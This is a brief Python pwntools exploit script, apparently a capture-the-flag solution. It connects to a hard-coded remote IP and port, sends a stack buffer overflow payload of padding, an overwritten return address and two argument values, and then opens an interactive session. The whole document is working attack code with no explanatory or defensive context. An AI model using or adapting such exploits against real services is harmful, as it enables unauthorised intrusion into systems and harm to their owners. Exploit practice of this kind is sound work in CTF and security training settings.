from pwn import *



p=remote("3.92.136.78",5000)

payload=""
payload+="A"*42
payload+=p32(0x8048567)
payload+="JUNK"
payload+=p32(0x12345678)
payload+=p32(0x87654321)
print p.recvuntil("name:")
p.sendline(payload)

p.interactive()


